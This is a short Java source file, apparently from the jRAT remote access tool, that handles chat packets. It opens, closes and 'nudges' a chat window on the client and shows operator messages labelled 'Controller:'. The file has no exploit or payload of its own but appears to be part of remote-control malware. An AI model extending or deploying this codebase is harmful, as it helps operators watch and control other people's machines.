package jrat.module.chat;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;

import javax.swing.text.AttributeSet;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyleContext;
import java.awt.*;


public class PacketChatAction implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
	    Type type = Type.values()[(int) con.readByte()];

        FrameChat instance = ChatClientModule.instance;

        switch (type) {
            case START:
                ChatClientModule.instance = new FrameChat(con);
                ChatClientModule.instance.setVisible(true);
                break;
            case END:
                instance.setVisible(false);
                instance.dispose();
                break;
            case MESSAGE:
                String message = con.readLine();

                if (instance != null) {
                    StyleContext sc = StyleContext.getDefaultStyleContext();
                    AttributeSet set = sc.addAttribute(SimpleAttributeSet.EMPTY, StyleConstants.Foreground, Color.red);
                    instance.txtChat.getDocument().insertString(instance.txtChat.getDocument().getLength(), "Controller: " + message + "\n", set);
                    instance.txtChat.setSelectionEnd(instance.txtChat.getText().length());
                    instance.txtChat.setSelectionStart(instance.txtChat.getText().length());
                }
                break;
            case NUDGE:
                instance.nudge();
                break;
        }
	}
}
